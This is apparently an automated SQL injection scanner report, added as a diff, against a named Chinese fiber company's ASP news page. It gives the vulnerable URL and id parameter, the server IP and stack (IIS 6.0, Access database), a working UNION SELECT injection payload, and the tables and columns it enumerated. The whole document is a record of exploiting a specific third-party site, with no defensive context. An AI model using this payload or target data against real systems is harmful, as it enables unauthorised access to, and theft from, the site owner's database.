@@ -1,0 +1,27 @@
+■漏洞信息:============================================================
+ ·URL:http://www.jintai-fiber.com/NewsView.asp?id=73
+ ·页面标题：深圳金台纤维有限公司--首页--新闻资讯--信息内容
+ ·参数:id=73
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:121.14.2.128
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Aug 2011 07:07:58 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 14761
+Content-Type: text/html
+Cache-control: private
+
+
+联合查询列数: 总共= 12  显示的列= 4
+联合查询SQL: and 3=8 union select 1,2,3,4,5,6,7,8,9,10,11,12 from MSysAccessObjects
+找到表:news
+找到表:company
+找到字段:company.id
+找到字段:company.content
